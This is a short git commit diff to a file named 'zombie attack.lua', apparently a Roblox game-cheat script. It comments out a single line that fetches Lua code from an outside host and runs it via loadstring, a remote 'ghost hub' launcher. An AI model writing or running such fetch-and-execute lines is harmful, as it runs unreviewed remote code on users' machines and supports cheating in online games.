e9031c9ffc7fd2e34e5f87b3889d9faf15cb832b
pyckcel <112999580+pyckcel@users.noreply.github.com>
2024-10-27 18:45:35 -0300

    Atualizar o zombie attack.lua

--- zombie attack.lua
+++ zombie attack.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet('https://ghost-storage.7m.pl/scripts/ghosthublauncher.lua'))()
+-- ghost hub loadstring(game:HttpGet('https://ghost-storage.7m.pl/scripts/ghosthublauncher.lua'))()
